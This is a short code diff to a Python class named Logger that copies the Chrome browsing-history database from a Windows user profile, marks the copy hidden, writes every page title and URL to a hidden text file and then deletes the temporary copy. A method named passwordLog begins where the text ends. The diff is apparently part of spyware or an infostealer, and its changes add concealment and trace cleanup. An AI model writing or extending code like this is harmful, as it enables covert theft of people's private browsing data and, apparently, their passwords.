@@ -135,6 +135,7 @@ class Logger():
         history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
         login_db = os.path.join(history_path, 'History')
         shutil.copyfile(login_db, "histdb.db")
+        win32api.SetFileAttributes("histdb.db", win32con.FILE_ATTRIBUTE_HIDDEN)
         c = sqlite3.connect("histdb.db")
         cursor = c.cursor()
         select_statement = "SELECT title, url FROM urls"
@@ -144,6 +145,8 @@ class Logger():
             for title, url in history:
                 f.write(f"Title: {str(title.encode('utf-8').decode('utf-8')).strip()}\nURL: {str(url.encode('utf-8').decode('utf-8')).strip()}" + "\n" + "-" * 50 + "\n")
             f.close()
+        c.close()
+        os.remove("histdb.db")
         win32api.SetFileAttributes("hist.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
     def passwordLog():
         try:
